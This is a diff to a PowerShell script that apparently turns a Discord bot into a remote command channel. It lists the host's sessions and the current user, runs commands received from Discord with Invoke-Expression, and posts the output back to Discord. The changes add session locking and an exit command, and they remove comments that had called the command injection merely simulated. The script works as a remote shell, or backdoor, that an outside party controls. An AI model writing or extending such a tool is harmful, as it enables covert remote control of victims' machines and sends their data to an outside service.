@@ -11,8 +11,9 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
-# Variable to store the selected session ID
+# Variable to store the selected session ID and user context
 $global:selectedSessionId = $null
+$global:sessionLocked = $false
 
 # Function to send a message to Discord
 function Send-DiscordMessage {
@@ -45,6 +46,11 @@ function Send-DiscordMessage {
 
 # Function to list running PowerShell sessions
 function List-Sessions {
+    if ($global:sessionLocked) {
+        Send-DiscordMessage -Message "A session is currently active. Use !exit_session to end it before listing other sessions."
+        return
+    }
+
     # Identify the current user
     $currentUser = whoami
     Send-DiscordMessage -Message "Listing sessions for user: $currentUser"
@@ -77,8 +83,6 @@ function Execute-InSession {
     if ($process) {
         try {
             # Inject the command into the selected session (simulating interaction)
-            # In reality, this would need to attach to the console or run a script in that process's context
-            # Simplified example below would log that the command would have been run in the process
             $output = Invoke-Command -ScriptBlock {Invoke-Expression $command} -ErrorAction Stop
 
             if ($output) {
@@ -98,6 +102,7 @@ function Execute-InSession {
         Send-DiscordMessage -Message $result
     } else {
         $global:selectedSessionId = $null
+        $global:sessionLocked = $false
         Send-DiscordMessage -Message "Session $sessionId is no longer running."
     }
 }
@@ -108,9 +113,16 @@ function Execute-PowerShellCommand {
         [string]$command
     )
 
-    # Check if a session has been selected, if so, run the command in that session
+    # If a session is active, only the selected session can run commands
     if ($global:selectedSessionId) {
-        Execute-InSession -sessionId $global:selectedSessionId -command $command
+        if ($command -eq "exit_session") {
+            # Exit the current session
+            $global:selectedSessionId = $null
+            $global:sessionLocked = $false
+            Send-DiscordMessage -Message "Exited the session. You can now select a new session."
+        } else {
+            Execute-InSession -sessionId $global:selectedSessionId -command $command
+        }
     } elseif ($command -eq "list_sessions") {
         $result = List-Sessions
         Send-DiscordMessage -Message $result
@@ -119,6 +131,7 @@ function Execute-PowerShellCommand {
         $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
         if ($process) {
             $global:selectedSessionId = $sessionId
+            $global:sessionLocked = $true
             Send-DiscordMessage -Message "Selected session $sessionId. Future commands will be sent to this session."
         } else {
             Send-DiscordMessage -Message "Invalid session ID: $sessionId"
